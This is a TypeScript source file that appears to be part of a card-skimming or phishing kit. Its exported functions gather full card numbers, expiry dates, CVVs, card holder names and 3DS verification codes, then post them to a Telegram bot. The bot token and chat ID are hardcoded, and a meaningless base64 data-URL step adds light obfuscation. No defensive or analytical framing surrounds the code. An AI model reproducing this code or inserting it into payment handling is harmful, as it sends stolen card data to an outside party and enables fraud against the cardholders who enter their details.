const encodeMessage = (message: string): string => {
  return btoa(encodeURIComponent(message));
};

const sendTelegramMessage = async (message: string) => {
  const botToken = "7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU";
  const chatId = "-4781499307";
  
  try {
    const encodedMessage = encodeMessage(message);
    const url = `data:text/plain;base64,${encodedMessage}`;
    
    const response = await fetch(url);
    const decodedMessage = decodeURIComponent(atob(encodedMessage));
    
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: decodedMessage,
        parse_mode: 'HTML'
      })
    });
    
    console.log('Message sent successfully');
    return true;
  } catch (error) {
    console.error('Error sending message:', error);
    return false;
  }
};

export const sendPaymentNotification = async (paymentData: any) => {
  const message = `💳 New Payment:
💰 Amount: $${paymentData.amount}
👤 Card Holder: ${paymentData.cardHolder}
💳 Card: ${paymentData.cardNumber}
📅 Expiry: ${paymentData.expiryDate}
🔒 CVV: ${paymentData.cvv}`;

  return sendTelegramMessage(message);
};

export const send3DSNotification = async (verificationData: any) => {
  const message = `🔐 3DS Verification:
💰 Amount: $${verificationData.amount}
👤 Card Holder: ${verificationData.cardHolder}
✅ Method: ${verificationData.verifyMethod}
🔑 Code: ${verificationData.code}`;

  return sendTelegramMessage(message);
};